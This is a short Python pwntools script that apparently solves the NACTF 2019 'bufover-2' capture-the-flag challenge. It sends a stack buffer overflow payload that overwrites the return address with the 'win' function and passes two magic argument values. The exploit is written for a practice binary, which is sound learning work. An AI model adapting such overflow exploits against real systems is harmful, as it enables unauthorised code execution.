from pwn import *

def exploit():
    #p = process("./bufover-2")
    p = remote("shell.2019.nactf.com", 31184)
    binary = ELF("bufover-2")
    padding = 28
    payload = ""
    payload += "A" * padding
    payload += p32(binary.symbols["win"])
    payload += "JUNK"
    payload += p32(0x14B4DA55)
    payload += p32(0) #i dont know why, just debug it on gdb :)
    payload += p32(0xF00DB4BE)

    #gdb.attach(p, """
    #            b *vuln+59
    #            c
    #            """)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()